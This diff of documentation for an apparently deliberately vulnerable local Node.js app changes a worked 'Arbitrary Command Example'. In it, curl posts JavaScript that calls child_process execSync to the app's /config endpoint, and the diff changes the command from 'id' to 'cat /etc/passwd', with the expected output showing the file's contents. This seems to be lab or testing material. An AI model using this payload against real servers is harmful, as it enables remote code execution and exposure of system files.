@@ -127,16 +127,20 @@ curl -X POST http://localhost:3000/register   -H "Content-Type: application/json
 
 #### Arbitrary Command Example
 ```bash
-curl -X POST http://localhost:3000/config   -H "Content-Type: text/plain"   --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("id").toString() })()'
+curl -X POST http://localhost:3000/config \
+  -H "Content-Type: text/plain" \
+  --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("cat /etc/passwd").toString() })()'
 
-curl -X POST http://localhost:3000/register   -H "Content-Type: application/json"   -d '{"username":"attacker"}'
-```
+curl -X POST http://localhost:3000/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attacker"}'
+
 
 Expected:
 ```json
-{"body":"uid=[user_id]([username]) gid=[group_id]([groupname]) groups=[group_info]\n"}
+{"body":"[contents of /etc/passwd]\n"}
 ```
-*Note: Actual output depends on server environment and user context*
+*Note: Actual output depends on the server environment and user context*
 
 ---
 
